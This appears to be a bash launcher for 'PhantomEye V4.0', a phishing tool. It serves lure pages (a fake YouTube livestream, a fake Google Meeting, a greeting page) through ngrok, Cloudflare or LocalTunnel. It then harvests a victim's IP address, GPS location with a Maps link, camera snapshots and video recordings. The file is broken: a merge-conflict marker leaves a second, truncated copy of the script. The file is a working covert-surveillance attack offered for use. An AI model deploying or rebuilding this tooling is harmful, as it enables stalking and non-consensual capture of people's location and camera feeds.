#!/bin/bash
# PhantomEye_V4.0 - Fixed and Enhanced
# Author - DreamDreafted (dreamdrafted000@gmail.com)
# Full data capture with location, images, and video chunks
# Fully compatible with Termux (Android) and Kali Linux

set -euo pipefail

windows_mode=false
termux_mode=false
kali_mode=false

# Detect platform properly
detect_platform() {
  if [[ "$(uname -a)" =~ MINGW|MSYS|CYGWIN|Windows ]]; then
    windows_mode=true
    echo "Windows system detected. Enabling Windows compatibility mode."
  elif [[ -n "${TERMUX_VERSION:-}" ]] || [[ -d "/data/data/com.termux/files" ]] || [[ "$(uname -o 2>/dev/null)" == "Android" ]]; then
    termux_mode=true
    echo "Termux/Android detected. Enabling Termux compatibility mode."
  elif [[ -f "/etc/os-release" ]] && grep -qi "kali" /etc/os-release; then
    kali_mode=true
    echo "Kali Linux detected. Enabling Kali compatibility mode."
  fi
}

banner() {
  clear
  printf "\e[1;92m ____  _   _    __    _  _  ____  _____  __  __  ____  _  _  ____   \e[0m\n"
  printf "\e[1;92m(  _ \( )_( )  /__\  ( \( )(_  _)(  _  )(  \/  )( ___)( \/ )( ___)  \e[0m\n"
  printf "\e[1;92m )___/ ) _ (  /(__)\  )  (   )(   )(_)(  )    (  )__)  \  /  )__)   \e[0m\n"
  printf "\e[1;92m(__)  (_) (_)(__)(__)(_)\_) (__) (_____)(_/\/\_)(____) (__) (____)  \e[0m\n"
  printf "\e[1;93m PhantomEye V4.0 | Author: DreamDrafted(dreamdrafted000@gmail.com) \e[0m \n"
  printf " \e[1;77m    Compatible with Termux, Kali, Windows, Linux, and macOS \e[0m \n"
  printf "\n"
  
  if [[ "$termux_mode" == true ]]; then
    printf " \e[1;96m[*] Platform: Termux (Android)\e[0m \n"
  elif [[ "$kali_mode" == true ]]; then
    printf " \e[1;96m[*] Platform: Kali Linux\e[0m \n"
  elif [[ "$windows_mode" == true ]]; then
    printf " \e[1;96m[*] Platform: Windows\e[0m \n"
  else
    printf " \e[1;96m[*] Platform: $(uname -s)\e[0m \n"
  fi
  printf "\n"
}

dependencies() {
  printf "\e[1;92m[*] Checking dependencies...\e[0m\n"
  
  local deps=("php" "curl" "unzip" "wget")
  local missing=()
  
  for dep in "${deps[@]}"; do
    if ! command -v "$dep" > /dev/null 2>&1; then
      missing+=("$dep")
    fi
  done 
  
  if [ ${#missing[@]} -ne 0 ]; then
    printf "\e[1;91m[!] Missing dependencies: %s\e[0m\n" "${missing[*]}"
    
    if [[ "$windows_mode" == true ]]; then
      printf "\e[1;92m[*] On Windows, please install these manually or use WSL\e[0m\n"
      exit 1
    elif [[ "$termux_mode" == true ]]; then
      printf "\e[1;92m[*] Termux detected. Installing dependencies...\e[0m\n"
      pkg update -y
      pkg install -y "${missing[@]}" termux-api openssh php-apache
      printf "\e[1;92m[✓] Dependencies installed successfully\e[0m\n"
    elif [[ "$kali_mode" == true ]]; then
      printf "\e[1;92m[*] Kali Linux detected. Installing dependencies...\e[0m\n"
      sudo apt update
      sudo apt install -y "${missing[@]}" apache2 libapache2-mod-php
      printf "\e[1;92m[✓] Dependencies installed successfully\e[0m\n"
    else
      printf "\e[1;92m[*] Attempting to install dependencies...\e[0m\n"
      if [[ -f "/etc/debian_version" ]]; then
        sudo apt update && sudo apt install -y "${missing[@]}"
      elif [[ -f "/etc/redhat-release" ]]; then
        sudo yum install -y "${missing[@]}"
      elif [[ "$(uname)" == "Darwin" ]]; then
        brew install "${missing[@]}"
      else
        printf "\e[1;91m[!] Please install dependencies manually: %s\e[0m\n" "${missing[*]}"
        exit 1
      fi
      printf "\e[1;92m[✓] Dependencies installed successfully\e[0m\n"
    fi
  else
    printf "\e[1;92m[✓] All dependencies are installed\e[0m\n"
  fi
}

stop() {
  printf "\n\e[1;92m[*] Stopping all processes...\e[0m\n"
  
  # Run auto-merge before stopping
  auto_merge_chunks
  
  if [[ "$windows_mode" == true ]]; then
    taskkill //F //IM "ngrok.exe" 2>/dev/null || true
    taskkill //F //IM "php.exe" 2>/dev/null || true
    taskkill //F //IM "cloudflared.exe" 2>/dev/null || true
    taskkill //F //IM "ssh.exe" 2>/dev/null || true
    taskkill //F //IM "node.exe" 2>/dev/null || true
    printf "\e[1;92m[*] Windows processes stopped\e[0m\n"
  else
    # Kill processes in reverse order of creation
    pkill -f "lt --port" > /dev/null 2>&1 || true
    pkill -f cloudflared > /dev/null 2>&1 || true
    pkill -f ngrok > /dev/null 2>&1 || true
    pkill -f "ssh.*serveo" > /dev/null 2>&1 || true
    pkill -f serveo > /dev/null 2>&1 || true
    pkill -f php > /dev/null 2>&1 || true
    
    # Kill screen sessions
    if command -v screen > /dev/null 2>&1; then
      screen -ls | grep -E "serveo-tunnel|ngrok-tunnel|cloudflared" | cut -d. -f1 | xargs -I {} screen -X -S {} quit 2>/dev/null || true
    fi
    
    if [[ "$termux_mode" == true ]]; then
      pkill -f sshd > /dev/null 2>&1 || true
    fi
    
    printf "\e[1;92m[*] All processes stopped\e[0m\n"
  fi

  printf "\e[1;96m[*] Check saved_videos/final/ for merged videos\e[0m\n"
  printf "\e[1;96m[*] Logs available in: auto_merge.log, Log_finish.log\e[0m\n"
  
  exit 0
}

auto_merge_chunks() {
  printf "\n\e[1;93m[*] Auto-merging orphaned video chunks...\e[0m\n"
  
  if [ -f "saved_videos/merge_handler.php" ]; then
    mkdir -p saved_videos/final 2>/dev/null
    php saved_videos/merge_handler.php "saved_videos" 2>&1 | tee -a auto_merge.log
    
    if [ $? -eq 0 ]; then
      printf "\e[1;92m[✓] Auto-merge completed successfully\e[0m\n"
    else
      printf "\e[1;91m[✗] Auto-merge encountered errors (see auto_merge.log)\e[0m\n"
    fi
  else
    printf "\e[1;93m[!] merge_handler.php not found, skipping auto-merge\e[0m\n"
  fi
}

catch_ip() {
  if [[ ! -f "ip.txt" ]]; then
    return
  fi
  
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r' || echo "Unknown")
  hostname=$(grep -a 'Hostname:' ip.txt | cut -d " " -f2 | tr -d '\r' || echo "Unknown")
  country=$(grep -a 'Country:' ip.txt | cut -d " " -f2 | tr -d '\r' || echo "Unknown")
  
  printf "\e[1;93m[+] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
  printf "\e[1;93m[+] Hostname:\e[0m\e[1;77m %s\e[0m\n" "$hostname"
  printf "\e[1;93m[+] Country:\e[0m\e[1;77m %s\e[0m\n" "$country"
  
  cat ip.txt >> saved.ip.txt 2>/dev/null || true
}

catch_location() {
  # Check for current_location.txt first
  if [[ -f "current_location.txt" ]]; then
    printf "\e[1;92m[+] Location data received:\e[0m\n"
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt 2>/dev/null || true
    printf "\n"
    mkdir -p saved_locations 2>/dev/null
    mv current_location.txt "saved_locations/location_$(date +%s).txt" 2>/dev/null || true
  fi
  
  # Check saved_locations directory
  if [[ -d "saved_locations" ]] && [[ -n "$(ls -A saved_locations/location_* 2>/dev/null)" ]]; then
    location_file=$(ls -t saved_locations/location_* 2>/dev/null | head -n 1)
    if [[ -f "$location_file" ]]; then
      lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r' || echo "N/A")
      lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r' || echo "N/A")
      acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r' || echo "N/A")
      maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r' || echo "N/A")
      
      printf "\e[1;93m[+] Latitude:\e[0m\e[1;77m %s\e[0m\n" "$lat"
      printf "\e[1;93m[+] Longitude:\e[0m\e[1;77m %s\e[0m\n" "$lon"
      printf "\e[1;93m[+] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" "$acc"
      if [[ "$maps_link" != "N/A" ]]; then
        printf "\e[1;93m[+] Google Maps:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"
      fi
      printf "\e[1;92m[*] Location saved to %s\e[0m\n" "$location_file"
    fi
  fi
}

checkfound() {
  mkdir -p saved_locations 2>/dev/null || true
  mkdir -p saved_videos/uploads 2>/dev/null || true
  mkdir -p saved_videos/final 2>/dev/null || true

  printf "\n"
  printf "\e[1;92m[*] Waiting for targets, Press Ctrl + C to exit...\e[0m\n"
  printf "\e[1;92m[*] Full data capture is \e[0m\e[1;93mACTIVE\e[0m\n"
  printf "\e[1;92m[*] Monitoring: Location | Images | Video Chunks\e[0m\n"
  printf "\e[1;92m[*] Working directory: %s\e[0m\n" "$(pwd)"
  
  while true; do
    # IP detection
    if [[ -f "ip.txt" ]]; then
      printf "\n\e[1;92m[+] Target opened the link!\n"
      catch_ip
      rm -f ip.txt 2>/dev/null || true
    fi

    # Location detection
    if [[ -f "current_location.txt" ]] || [[ -f "LocationLog.log" ]]; then
      printf "\n\e[1;92m[+] Location data received!\e[0m\n"
      catch_location
      rm -f LocationLog.log 2>/dev/null || true
    fi

    # Snapshot detection
    if [[ -f "Log.log" ]]; then
      printf "\n\e[1;92m[+] Camera snapshot received!\e[0m\n"
      rm -f Log.log 2>/dev/null || true
    fi

    # Video chunk detection
    if [[ -f "saved_videos/Log_video.log" ]]; then
      printf "\n\e[1;93m[+] Video chunk received!\e[0m\n"
      rm -f "saved_videos/Log_video.log" 2>/dev/null || true
    fi

    # Final video detection
    if [[ -f "saved_videos/Log_finish.log" ]]; then
      printf "\n\e[1;94m[+] Recording finished! Final video saved.\e[0m\n"
      rm -f "saved_videos/Log_finish.log" 2>/dev/null || true
    fi

    sleep 1
  done 
}

payload_server() {
  link=$1
  printf "\e[1;92m[*] Setting up payload with link: %s\e[0m\n" "$link"
  
  # Create index.php with the forwarding link
  sed "s+forwarding_link+$link+g" template.php > index.php || { 
    printf "\e[1;91m[!] Error creating index.php\e[0m\n" 
    exit 1 
  }
  
  mkdir -p saved_videos/uploads saved_videos/final 2>/dev/null || true
  
  # Copy post.php to saved_videos directory
  if [[ -f "post.php" ]]; then
    cp -f post.php saved_videos/ 2>/dev/null || printf "\e[1;93m[!] Could not copy post.php to saved_videos/\e[0m\n"
  else
    printf "\e[1;91m[!] post.php not found! Place it next to this script.\e[0m\n"
  fi

  # Create template-specific pages
  if [[ ${option_tem} -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" phantomgreet.html > index2.html 2>/dev/null || true
  elif [[ ${option_tem} -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" ytlivestreem.html > index2.html 2>/dev/null || true
  elif [[ ${option_tem} -eq 3 ]]; then
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html 2>/dev/null || true
  fi

  # Create merge_handler.php if it doesn't exist
  if [[ ! -f "saved_videos/merge_handler.php" ]]; then
    cat > saved_videos/merge_handler.php << 'EOF'
<?php
// Simple merge handler - replace with actual implementation
$dir = isset($argv[1]) ? $argv[1] : '.';
echo "Merging video chunks in: $dir\n";
if (is_dir($dir)) {
    $files = glob("$dir/uploads/*.mp4");
    if (count($files) > 0) {
        echo "Found " . count($files) . " video chunks\n";
        // Add actual merge logic here
        file_put_contents("$dir/final/merged_" . time() . ".txt", 
                         "Video chunks found: " . implode(", ", $files));
    }
}
?>
EOF
  fi
}

select_template() {
  printf "\n-----Choose a template----\n"    
  printf "\n\e[1;92m[01]\e[0m\e[1;93m Phantomgreeter \e[0m\n"
  printf "\e[1;92m[02]\e[0m\e[1;93m YT Live Streem \e[0m\n"
  printf "\e[1;92m[03]\e[0m\e[1;93m Google Meeting \e[0m\n"
  
  default_option_template="1"
  read -p $'\n\e[1;92m[+] Choose a template: [Default is 1] \e[0m' option_tem
  option_tem="${option_tem:-${default_option_template}}"
  
  # Tempate options
  case ${option_tem} in
    1|2|3)
      printf "\e[1;92m[*] Using template option %s\e[0m\n" "$option_tem"
      ;;
    *)
      printf "\e[1;93m[!] Invalid template option! try again\e[0m\n"
      sleep 1
      select_template
      ;;
  esac
}

cloudflare_tunnel() {
  printf "\e[1;92m[*] Setting up Cloudflare Tunnel...\e[0m\n"
  
  # Download cloudflared if needed
  if [[ "$windows_mode" == true ]]; then
    if [[ ! -f "cloudflared.exe" ]]; then
      printf "\e[1;92m[+] Downloading Cloudflared for Windows...\n"
      wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -O cloudflared.exe
      if [[ -f "cloudflared.exe" ]]; then
        chmod +x cloudflared.exe
      else
        printf "\e[1;91m[!] Failed to download cloudflared\e[0m\n"
        return 1
      fi
    fi
    cloudflared_cmd="./cloudflared.exe"
  else
    if [[ ! -f "cloudflared" ]]; then
      printf "\e[1;92m[+] Downloading Cloudflared...\n"
      
      arch=$(uname -m)
      os=$(uname -s | tr '[:upper:]' '[:lower:]')
      
      if [[ "$termux_mode" == true ]]; then
        # Termux - ARM64
        wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O cloudflared
      elif [[ "$os" == "darwin" ]]; then
        # macOS
        if [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz" -O cloudflared.tgz
          tar -xzf cloudflared.tgz
          mv cloudflared-darwin-arm64 cloudflared
          rm -f cloudflared.tgz
        else
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O cloudflared.tgz
          tar -xzf cloudflared.tgz
          mv cloudflared-darwin-amd64 cloudflared
          rm -f cloudflared.tgz
        fi
      else
        # Linux
        if [[ "$arch" == "x86_64" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared
        elif [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O cloudflared
        elif [[ "$arch" == "armv7l" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" -O cloudflared
        else
          # Default to amd64
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared
        fi
      fi
      
      if [[ -f "cloudflared" ]]; then
        chmod +x cloudflared
      else
        printf "\e[1;91m[!] Failed to download cloudflared\e[0m\n"
        return 1
      fi
    fi
    cloudflared_cmd="./cloudflared"
  fi

  printf "\e[1;92m[+] Starting PHP server...\n"
  
  # Start PHP server in background
  if [[ "$termux_mode" == true ]]; then
    php -S 127.0.0.1:3333 -t . > /dev/null 2>&1 &
  else
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2
  
  printf "\e[1;92m[+] Starting Cloudflared tunnel...\n"
  rm -f .cloudflared.log 2>/dev/null
  
  # Start cloudflared
  $cloudflared_cmd tunnel --url http://localhost:3333 > .cloudflared.log 2>&1 &
  CLOUDFLARED_PID=$!
  
  sleep 12
  
  # Extract link from logs
  link=$(grep -o 'https://[^ ]*\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null | head -n 1)
  
  if [[ -z "$link" ]]; then
    link=$(grep -o 'https://[^ ]*\.cloudflared\.net' ".cloudflared.log" 2>/dev/null | head -n 1)
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;93m[!] Could not extract link automatically\e[0m\n"
    printf "\e[1;92m[*] Check .cloudflared.log for details\e[0m\n"
    printf "\e[1;92m[*] Cloudflared output:\e[0m\n"
    tail -20 .cloudflared.log 2>/dev/null || true
    read -p $'\e[1;92m[*] Enter the Cloudflare URL manually: \e[0m' link
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;91m[!] No valid link obtained\e[0m\n"
    kill $PHP_PID 2>/dev/null || true
    kill $CLOUDFLARED_PID 2>/dev/null || true
    return 1
  fi

  printf "\e[1;92m[✓] Cloudflared URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
  payload_server "$link"
  checkfound
}

ngrok_server() {
  printf "\e[1;92m[*] Setting up Ngrok Tunnel...\e[0m\n"
  
  # Download ngrok if needed
  if [[ "$windows_mode" == true ]]; then
    if [[ ! -f "ngrok.exe" ]]; then
      printf "\e[1;92m[+] Downloading Ngrok for Windows...\n"
      wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -O ngrok.zip
      if [[ -f "ngrok.zip" ]]; then
        unzip -o ngrok.zip > /dev/null 2>&1
        rm -f ngrok.zip
        chmod +x ngrok.exe
      else
        printf "\e[1;91m[!] Failed to download ngrok\e[0m\n"
        return 1
      fi
    fi
    ngrok_cmd="./ngrok.exe"
  else
    if [[ ! -f "ngrok" ]]; then
      printf "\e[1;92m[+] Downloading Ngrok...\n"
      
      arch=$(uname -m)
      os=$(uname -s | tr '[:upper:]' '[:lower:]')
      
      if [[ "$termux_mode" == true ]]; then
        # Termux - ARM64
        wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" -O ngrok.zip
      elif [[ "$os" == "darwin" ]]; then
        # macOS
        if [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip" -O ngrok.zip
        else
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip" -O ngrok.zip
        fi
      else
        # Linux
        if [[ "$arch" == "x86_64" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" -O ngrok.zip
        elif [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" -O ngrok.zip
        elif [[ "$arch" == "armv7l" ]] || [[ "$arch" == "armv6l" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip" -O ngrok.zip
        else
          # Default to amd64
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" -O ngrok.zip
        fi
      fi
      
      if [[ -f "ngrok.zip" ]]; then
        unzip -o ngrok.zip > /dev/null 2>&1
        rm -f ngrok.zip
        chmod +x ngrok
      else
        printf "\e[1;91m[!] Failed to download ngrok\e[0m\n"
        return 1
      fi
    fi
    ngrok_cmd="./ngrok"
  fi

  printf "\e[1;92m[+] Starting PHP server...\n"
  
  # Start PHP server
  if [[ "$termux_mode" == true ]]; then
    php -S 127.0.0.1:3333 -t . > /dev/null 2>&1 &
  else
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2

  printf "\e[1;92m[+] Starting Ngrok tunnel...\n"
  
  # Start ngrok
  $ngrok_cmd http 3333 > /dev/null 2>&1 &
  NGROK_PID=$!
  
  sleep 10

  # Get ngrok URL from API
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | head -1 | cut -d'"' -f4)
  
  if [[ -z "$link" ]]; then
    printf "\e[1;93m[!] Could not get ngrok URL from API\e[0m\n"
    printf "\e[1;92m[*] Visit http://127.0.0.1:4040 to see ngrok status\n"
    read -p $'\e[1;92m[*] Enter the Ngrok URL manually: \e[0m' link
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;91m[!] No valid link obtained\e[0m\n"
    kill $PHP_PID 2>/dev/null || true
    kill $NGROK_PID 2>/dev/null || true
    return 1
  fi

  printf "\e[1;92m[✓] Ngrok URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
  payload_server "$link"
  checkfound
}

local_php_server() {
  printf "\e[1;92m[*] Setting up Local PHP Server...\e[0m\n"
  
  # Get local IP
  local_ip=$(get_local_ip)
  
  if [[ -z "$local_ip" ]] || [[ "$local_ip" == "127.0.0.1" ]]; then
    printf "\e[1;93m[!] Could not detect local IP address\e[0m\n"
    
    if [[ "$termux_mode" == true ]]; then
      printf "\e[1;92m[*] Termux: Make sure WiFi is connected\n"
      printf "\e[1;92m[*] Run: termux-wifi-connectioninfo\n"
      local_ip="127.0.0.1"
    elif [[ "$kali_mode" == true ]]; then
      printf "\e[1;92m[*] Kali: Check network connection\n"
      printf "\e[1;92m[*] Run: ip addr show\n"
    fi
  fi
  
  printf "\e[1;92m[+] Starting PHP server on %s:3333...\n" "$local_ip"
  
  # Start PHP server
  if [[ "$termux_mode" == true ]]; then
    php -S 0.0.0.0:3333 -t . > /dev/null 2>&1 &
  else
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2
  
  link="http://$local_ip:3333"
  
  if [[ "$local_ip" == "127.0.0.1" ]]; then
    printf "\e[1;93m[!] Warning: Using localhost (127.0.0.1)\e[0m\n"
    printf "\e[1;92m[*] Target must be on the same device to access this link\n"
  else
    printf "\e[1;92m[✓] Local server URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
    printf "\e[1;92m[*] Target must be on the same network\n"
  fi
  
  payload_server "$link"
  checkfound
}

localtunnel_server() {
  printf "\e[1;92m[*] Setting up LocalTunnel...\e[0m\n"
  
  # Check if Node.js and npm are installed
  if ! command -v npm > /dev/null 2>&1; then
    printf "\e[1;93m[!] Node.js/npm not found\e[0m\n"
    
    if [[ "$termux_mode" == true ]]; then
      printf "\e[1;92m[*] Installing Node.js on Termux...\n"
      pkg install -y nodejs
    elif [[ "$kali_mode" == true ]]; then
      printf "\e[1;92m[*] Installing Node.js on Kali...\n"
      sudo apt update && sudo apt install -y nodejs npm
    else
      printf "\e[1;91m[!] Please install Node.js and npm first\e[0m\n"
      return 1
    fi
  fi
  
  # Install localtunnel if not installed
  if ! command -v lt > /dev/null 2>&1; then
    printf "\e[1;92m[+] Installing localtunnel...\n"
    if [[ "$termux_mode" == true ]]; then
      npm install -g localtunnel --unsafe-perm > /dev/null 2>&1
    else
      npm install -g localtunnel > /dev/null 2>&1
    fi
  fi
  
  printf "\e[1;92m[+] Starting PHP server...\n"
  
  # Start PHP server
  if [[ "$termux_mode" == true ]]; then
    php -S 127.0.0.1:3333 -t . > /dev/null 2>&1 &
  else
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2

  printf "\e[1;92m[+] Starting LocalTunnel...\n"
  
  # Generate random subdomain
  subdomain="phantom$(date +%s)"
  rm -f lt.log 2>/dev/null
  
  # Start localtunnel
  lt --port 3333 --subdomain "$subdomain" > lt.log 2>&1 &
  LT_PID=$!
  
  sleep 10

  # Extract link from logs
  link=$(grep -o "https://$subdomain.loca.lt" lt.log 2>/dev/null | head -n 1)
  
  if [[ -z "$link" ]]; then
    link=$(grep -o 'https://[^"]*\.loca\.lt' lt.log 2>/dev/null | head -n 1)
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;93m[!] Could not extract LocalTunnel URL\e[0m\n"
    printf "\e[1;92m[*] Check lt.log for details\n"
    read -p $'\e[1;92m[*] Enter the LocalTunnel URL manually: \e[0m' link
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;91m[!] No valid link obtained\e[0m\n"
    kill $PHP_PID 2>/dev/null || true
    kill $LT_PID 2>/dev/null || true
    return 1
  fi

  printf "\e[1;92m[✓] LocalTunnel URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
  payload_server "$link"
  checkfound
}

get_local_ip() {
  local local_ip=""
  
  if [[ "$windows_mode" == true ]]; then
    # Windows
    local_ip=$(ipconfig | grep -i "IPv4 Address" | grep -v "192\.168\.137" | head -1 | cut -d: -f2 | tr -d '[:space:]')
  elif [[ "$termux_mode" == true ]]; then
    # Termux/Android
    if command -v termux-wifi-connectioninfo > /dev/null 2>&1; then
      local_ip=$(termux-wifi-connectioninfo | grep -o '"ip":"[^"]*"' | cut -d'"' -f4)
    fi
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip route get 1 2>/dev/null | grep -oP 'src \K\S+' | head -1)
    fi
  elif [[ "$kali_mode" == true ]] || [[ -f "/etc/debian_version" ]]; then
    # Kali/Debian Linux
    local_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
  else
    # Other Linux/macOS
    local_ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
  fi
  
  echo "$local_ip"
}

phantomeye() {
  printf "\e[1;92m[*] Cleaning up old files...\e[0m\n"
  rm -rf sendlink 2>/dev/null || true
  rm -f ip.txt current_location.txt LocationLog.log Log.log 2>/dev/null || true

  printf "\n-----Choose tunnel server----\n"    
  printf "\n\e[1;92m[01]\e[0m\e[1;93m Ngrok\e[0m\n"
  printf "\e[1;92m[02]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
  printf "\e[1;92m[03]\e[0m\e[1;93m LocalTunnel\e[0m\n"
  printf "\e[1;92m[04]\e[0m\e[1;93m Local PHP Server (Same Network)\e[0m\n"
  
  default_option_server="2"
  read -p $'\n\e[1;92m[+] Choose a Port Forwarding option: [Default is 2] \e[0m' option_server
  option_server="${option_server:-${default_option_server}}"
  
  select_template

  case $option_server in
    1)
      ngrok_server
      ;;
    2)
      cloudflare_tunnel
      ;;
    3)
      localtunnel_server
      ;;
    4)
      local_php_server
      ;;
    *)
      printf "\e[1;91m[!] Invalid option selected\e[0m\n"
      sleep 1
      clear
      banner
      phantomeye
      ;;
  esac
}

# Main execution
main() {
  detect_platform
  banner
  dependencies
  phantomeye
}

# Set up trap for cleanup
trap 'stop' INT TERM

# Run main function
main
=======
#!/bin/bash
# PhantomEye_V4.0 - Fixed and Enhanced
# Author - DreamDrafted (https://github.com/dreamed000/PhantomEye.git)
# Fully compatible with Termux (Android) and Kali Linux

set -euo pipefail

windows_mode=false
termux_mode=false
kali_mode=false

# Detect platform properly
detect_platform() {
  if [[ "$(uname -a)" =~ MINGW|MSYS|CYGWIN|Windows ]]; then
    windows_mode=true
    echo "Windows system detected. Enabling Windows compatibility mode."
  elif [[ -n "${TERMUX_VERSION:-}" ]] || [[ -d "/data/data/com.termux/files" ]] || [[ "$(uname -o 2>/dev/null)" == "Android" ]]; then
    termux_mode=true
    echo "Termux/Android detected. Enabling Termux compatibility mode."
  elif [[ -f "/etc/os-release" ]] && grep -qi "kali" /etc/os-release; then
    kali_mode=true
    echo "Kali Linux detected. Enabling Kali compatibility mode."
  fi
}

banner() {
  clear
  printf "\e[1;92m ____  _   _    __    _  _  ____  _____  __  __  ____  _  _  ____   \e[0m\n"
  printf "\e[1;92m(  _ \( )_( )  /__\  ( \( )(_  _)(  _  )(  \/  )( ___)( \/ )( ___)  \e[0m\n"
  printf "\e[1;92m )___/ ) _ (  /(__)\  )  (   )(   )(_)(  )    (  )__)  \  /  )__)   \e[0m\n"
  printf "\e[1;92m(__)  (_) (_)(__)(__)(_)\_) (__) (_____)(_/\/\_)(____) (__) (____)  \e[0m\n"
  printf "\e[1;93mPhantomEye V4.0 | Author: DreamDrafted (dreamdrafted000@gmail.com) \e[0m \n"
  printf " \e[1;77m   Compatible with Termux, Kali, Windows, Linux, and macOS \e[0m \n"
  printf "\n"
  
  if [[ "$termux_mode" == true ]]; then
    printf " \e[1;96m[*] Platform: Termux (Android)\e[0m \n"
  elif [[ "$kali_mode" == true ]]; then
    printf " \e[1;96m[*] Platform: Kali Linux\e[0m \n"
  elif [[ "$windows_mode" == true ]]; then
    printf " \e[1;96m[*] Platform: Windows\e[0m \n"
  else
    printf " \e[1;96m[*] Platform: $(uname -s)\e[0m \n"
  fi
  printf "\n"
}

dependencies() {
  printf "\e[1;92m[*] Checking dependencies...\e[0m\n"
  
  local deps=("php" "curl" "unzip" "wget")
  local missing=()
  
  for dep in "${deps[@]}"; do
    if ! command -v "$dep" > /dev/null 2>&1; then
      missing+=("$dep")
    fi
  done 
  
  if [ ${#missing[@]} -ne 0 ]; then
    printf "\e[1;91m[!] Missing dependencies: %s\e[0m\n" "${missing[*]}"
    
    if [[ "$windows_mode" == true ]]; then
      printf "\e[1;92m[*] On Windows, please install these manually or use WSL\e[0m\n"
      exit 1
    elif [[ "$termux_mode" == true ]]; then
      printf "\e[1;92m[*] Termux detected. Installing dependencies...\e[0m\n"
      pkg update -y
      pkg install -y "${missing[@]}" termux-api openssh php-apache
      printf "\e[1;92m[✓] Dependencies installed successfully\e[0m\n"
    elif [[ "$kali_mode" == true ]]; then
      printf "\e[1;92m[*] Kali Linux detected. Installing dependencies...\e[0m\n"
      sudo apt update
      sudo apt install -y "${missing[@]}" apache2 libapache2-mod-php
      printf "\e[1;92m[✓] Dependencies installed successfully\e[0m\n"
    else
      printf "\e[1;92m[*] Attempting to install dependencies...\e[0m\n"
      if [[ -f "/etc/debian_version" ]]; then
        sudo apt update && sudo apt install -y "${missing[@]}"
      elif [[ -f "/etc/redhat-release" ]]; then
        sudo yum install -y "${missing[@]}"
